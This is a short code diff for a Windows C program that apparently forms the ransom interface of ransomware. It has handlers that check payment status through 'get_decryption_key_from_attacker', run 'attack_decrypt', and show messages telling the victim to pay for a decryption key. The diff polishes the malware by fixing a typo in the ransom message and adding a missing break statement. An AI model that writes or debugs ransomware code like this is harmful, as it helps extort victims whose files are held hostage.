@@ -213,7 +213,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
         // Handle Check payment status
         case 1:
             if (get_decryption_key_from_attacker() != 0) {
-                MessageBox(hwnd, "Please complete the payment to obtain the key. \r\n Note: the payment is registered after abount 1 hour.", "Info", MB_OK | MB_ICONINFORMATION);
+                MessageBox(hwnd, "Please complete the payment to obtain the key. \r\nNote: the payment is registered after about 1 hour.", "Info", MB_OK | MB_ICONINFORMATION);
             } else {
                 MessageBox(hwnd, "Ready for decryption!", "Info", MB_OK | MB_ICONINFORMATION);
             }
@@ -233,10 +233,11 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
                 SetClipboardData(CF_TEXT, hMem);
                 CloseClipboard();
             }
+            break;
         // Handle decrypt
         case 3:
             if (attack_decrypt() != 0) {
-                MessageBox(hwnd, "Please complete the payment to obtain the key. \r\n Note: the payment is registered after abount 1 hour.", "Info", MB_OK | MB_ICONINFORMATION);
+                MessageBox(hwnd, "Please complete the payment to obtain the key. \r\nNote: the payment is registered after about 1 hour.", "Info", MB_OK | MB_ICONINFORMATION);
             } else {
                 MessageBox(hwnd, "Your files have been decrypted!", "Info", MB_OK | MB_ICONINFORMATION);
             }
